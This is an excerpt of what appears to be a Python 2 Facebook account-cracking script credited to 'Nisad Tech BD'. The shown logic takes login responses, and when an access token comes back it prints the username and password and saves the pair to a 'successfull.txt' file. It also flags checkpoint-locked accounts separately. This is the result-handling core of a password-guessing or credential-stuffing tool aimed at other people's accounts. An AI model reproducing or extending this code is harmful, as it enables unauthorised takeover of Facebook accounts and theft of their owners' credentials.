...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Nisad Tech BD  <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> facebook.com/NisadTechBD100 \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> github.com/NisadTechBD <--- \n\x1b[1;97m--------------------------------------------------'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[RINKU-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[RINKU-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Login 7 Days]\x1b[0m \n'
